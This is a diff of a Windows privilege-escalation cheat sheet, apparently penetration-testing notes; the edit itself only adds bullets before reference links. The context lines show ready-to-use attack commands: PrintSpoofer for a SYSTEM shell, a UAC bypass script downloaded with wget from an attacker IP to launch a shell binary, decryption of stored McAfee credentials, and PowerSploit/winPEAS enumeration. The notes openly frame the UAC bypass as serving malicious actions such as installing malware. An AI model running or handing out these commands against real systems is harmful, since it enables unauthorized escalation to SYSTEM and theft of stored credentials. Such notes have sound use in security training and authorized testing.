@@ -106,13 +106,13 @@ sc query <service_name>
 sc start <service_name>  
 ```
 
-https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  
+- https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite  
 
 ### SeImpersonatePrivilege
 ```powershell
 PrintSpoofer64.exe -i -c cmd
 ```
-https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+- https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 
 ### Autorun
 -> Detection - windows
@@ -151,7 +151,8 @@ logoff
 
 ### Bypass UAC
 After obtaining a reverse shell on a machine with a local administrator user, it may be necessary to bypass User Account Control (UAC) to perform specific malicious actions, such as persistently installing malware, modifying security settings, or exploiting system vulnerabilities. This can be done through specialized techniques and tools designed to bypass the restrictions imposed by UAC.
-https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/
+- https://decoder.cloud/2017/02/03/bypassing-uac-from-a-remote-powershell-and-escalting-to-system/
+
 #### EventViewer
 -> Step 1 - Kali
 ```bash
@@ -186,10 +187,10 @@ wget 192.168.119.139:805/Invoke-EventViewer.ps1 -O Invoke-EventViewer.ps1
 Invoke-EventViewer cmd.exe /c "C:\Windows\tasks\shell2.exe"
 Invoke-EventViewer C:\Windows\tasks\shell2.exe
 ```
-https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
+- https://raw.githubusercontent.com/CsEnox/EventViewer-UACBypass/main/Invoke-EventViewer.ps1
 
 #### FodhelperBypass
-https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
+- https://raw.githubusercontent.com/winscripting/UAC-bypass/master/FodhelperBypass.ps1
 
 ### Capturing configuration file credentials
 -> Powershell History  
@@ -234,7 +235,7 @@ C:\ProgramData\McAfee\Agent\DB\ma.db
 sqlitebrowser ma.db
 python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 ```
-https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
+- https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/master/mcafee_sitelist_pwd_decrypt.py
 
 ## Windows Enumeration Tools
 -> PowerUp.ps1  
@@ -242,16 +243,16 @@ https://raw.githubusercontent.com/funoverip/mcafee-sitelist-pwd-decryption/maste
 . .\PowerUp.ps1
 Invoke-AllChecks
 ```
-https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  
+- https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1  
 
 -> winPEASany.exe
 ```powershell
 winPEASany.exe
 ```
-https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  
+- https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  
 
 -> windows-privesc-check2.exe  
 ```powershell
 windows-privesc-check2.exe --dump -G
 ```
-https://github.com/pentestmonkey/windows-privesc-check
+- https://github.com/pentestmonkey/windows-privesc-check
